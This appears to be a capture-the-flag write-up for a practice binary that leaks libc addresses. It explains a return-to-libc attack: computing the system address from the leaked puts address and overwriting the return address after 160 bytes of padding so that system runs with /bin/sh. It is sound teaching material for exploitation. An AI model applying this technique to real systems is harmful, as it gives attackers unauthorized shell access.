# Got 2 Learn libc

This program gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33 on the shell server.


## Solution
The solution to this problem is `ret2libc`. Return to libc is a technique of redirecting code execution to a well known function in libc. For this particular problem I decided to return to the `system` function to get a shell.


### How does it work?
The binary gives us a set of addresses of `libc` functions:

```
$ ./vuln
Here are some useful addresses:

puts: 0xf6a43890
fflush 0xf6a419f0
read: 0xf6abb3e0
write: 0xf6abb450
useful_string: 0x5c9ae030

Enter a string:
```

The two addresses that I decided to use from this output was `puts` function address and the `useful_string` address. The `useful_string` address points to the string `/bin/sh`.


**NOTE: I discovered that the offset between the `puts` function and the `system` function, in libc, is the same regardless of ASLR.**

I wrote a `C` program to give me the offset amount:

```
$ ./libc_addr
puts:           0xec742890
system:         0xec71d850
offset:         -151616
new_ptr:        0xec71d850
```

#### Generating the Shellcode
Using the `puts` function pointer and the useful_string address from running `./vuln` and the offset from running `./libc_addr`, we craft an input string that results in the following stack state:

```
|-----------------| <-- ebp+20
| \n\0\0\0        |
|-----------------| <-- ebp+16
| useful_str_addr |             (this is the first argument for system)
|-----------------| <-- ebp+12
| puts_addr       |             (this is the return address for the libc system function call)
|-----------------| <-- ebp+8
| system_addr     |             (this is calculated: system_addr = puts_addr + offset)
|-----------------| <-- ebp+4
|                 |
| AAAAAAAA....    |
| AAAAAAAAAAAAA   |             (There is 160 bytes between the input buffer and the return address)
|                 |
|-----------------| <-- ebp-156
```

In the diagram, we have effectively created a [call stack](https://en.wikipedia.org/wiki/Call_stack) for the libc `system` function.

